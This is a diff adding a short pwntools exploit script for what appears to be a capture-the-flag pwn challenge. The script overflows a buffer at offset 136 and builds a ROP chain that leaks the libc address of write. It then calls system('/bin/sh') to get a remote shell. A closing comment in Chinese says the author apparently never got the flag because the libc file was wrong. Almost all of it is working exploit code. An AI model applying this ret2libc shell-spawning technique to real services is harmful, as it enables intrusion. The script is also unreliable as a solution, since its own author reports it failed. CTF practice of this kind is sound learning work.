@@ -1,0 +1,20 @@
+from pwn import*
+p=remote("2ab3f44e1ab83d40d8a6f436.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="2ab3f44e1ab83d40d8a6f436.tcp-ctf2.dasctf.com")
+elf=ELF('pwn')
+offset=136
+payload=b'A'*offset+p64(0x4006b3)+p64(1)+p64(0x4006b1)+p64(elf.got['write'])+p64(0xdeadbeef)+p64(0x4004B0)+p64(elf.symbols['main'])
+p.sendline(payload)
+p.recvuntil(b'\n')
+leak=p.recv(8)
+write_addr=u64(leak)
+print(hex(write_addr))
+libc = ELF('./libc6.so')
+libc_base = write_addr - libc.symbols['write']
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+payload2 = b'A' * 136
+payload2 += p64(0x4006b3) + p64(binsh_addr)
+payload2 += p64(system_addr)
+p.sendline(payload2)
+p.interactive()
+#最后一版自己写的代码。。好像因为so文件下载的不对最终没有拿到flag。留给后人看看叭~
